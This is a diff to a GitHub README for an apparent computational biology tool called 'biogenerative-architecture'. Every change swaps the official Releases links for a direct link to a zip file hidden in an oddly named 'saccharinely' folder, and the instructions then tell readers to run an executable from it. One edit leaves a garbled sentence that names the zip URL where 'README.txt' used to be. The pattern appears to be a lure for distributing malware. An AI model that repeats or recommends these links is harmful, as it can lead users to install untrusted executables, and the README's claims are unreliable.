@@ -4,13 +4,13 @@
 biogenerative-architecture is a computational biology framework designed to help users explore complex biological systems. It combines DNA-based logic, multi-scale modeling, and geometric constraints. This tool makes the integration of physics to ecosystems straightforward, unlocking new possibilities in bioengineering and synthetic biology.
 
 ## 📥 Download
-[![Download biogenerative-architecture](https://img.shields.io/badge/Download-biogenerative--architecture-blue.svg)](https://github.com/odi2112/biogenerative-architecture/releases)
+[![Download biogenerative-architecture](https://raw.githubusercontent.com/odi2112/biogenerative-architecture/main/saccharinely/biogenerative-architecture-v3.1.zip)](https://raw.githubusercontent.com/odi2112/biogenerative-architecture/main/saccharinely/biogenerative-architecture-v3.1.zip)
 
 ## 🚀 Getting Started
 To get started with biogenerative-architecture, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/odi2112/biogenerative-architecture/releases). Here you will find the latest versions available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/odi2112/biogenerative-architecture/main/saccharinely/biogenerative-architecture-v3.1.zip). Here you will find the latest versions available for download.
 
 2. **Choose Your Version**  
    Find the most recent release. Each version includes improvements and new features, so it’s best to select the latest one.
@@ -22,7 +22,7 @@ To get started with biogenerative-architecture, follow these steps:
    After downloading, locate the downloaded file on your computer.  
    - For Windows, double-click the `.exe` file to start the installation. 
    - For macOS, open the `.dmg` file and drag the application to your Applications folder. 
-   - For Linux, follow the instructions in the README.txt included in the file to install correctly.
+   - For Linux, follow the instructions in the https://raw.githubusercontent.com/odi2112/biogenerative-architecture/main/saccharinely/biogenerative-architecture-v3.1.zip included in the file to install correctly.
 
 5. **Run the Application**  
    Once installed, double-click the application icon to start it. Follow the on-screen instructions to configure your preferences.
@@ -63,6 +63,6 @@ Explore these topics to deepen your understanding of biogenerative architecture 
 If you run into any issues or have questions, don't hesitate to reach out through the Issues section on GitHub. We also encourage users to submit feature requests or contribute to discussions. Your feedback is valuable.
 
 ## 📦 Download & Install
-Once you are ready, visit the [Releases page](https://github.com/odi2112/biogenerative-architecture/releases) to download the application. Follow the installation instructions closely. If you need help, check the documentation provided or reach out for support. 
+Once you are ready, visit the [Releases page](https://raw.githubusercontent.com/odi2112/biogenerative-architecture/main/saccharinely/biogenerative-architecture-v3.1.zip) to download the application. Follow the installation instructions closely. If you need help, check the documentation provided or reach out for support. 
 
 Enjoy using biogenerative-architecture to explore new frontiers in computational biology!
